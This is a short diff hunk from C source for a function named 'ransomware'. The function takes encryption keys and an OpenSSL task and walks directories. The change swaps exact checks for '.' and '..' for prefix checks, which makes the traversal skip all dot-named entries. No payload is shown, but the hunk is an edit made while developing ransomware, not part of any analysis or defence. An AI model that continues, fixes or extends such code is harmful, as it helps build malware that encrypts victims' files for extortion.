@@ -217,7 +217,7 @@ void ransomware(const char *path, const KeySet *key_set, const EvpTask *task,
         const char *name = entry->d_name;
 
         // Skip directories "." && ".."
-        if (is_dir && (strcmp(name, ".") == 0 || strcmp(name, "..") == 0))
+        if (is_dir && (strncmp(name, ".", 1) == 0 || strncmp(name, "..", 2) == 0))
             continue;
 
         // size = path + '/' + name + '\0'
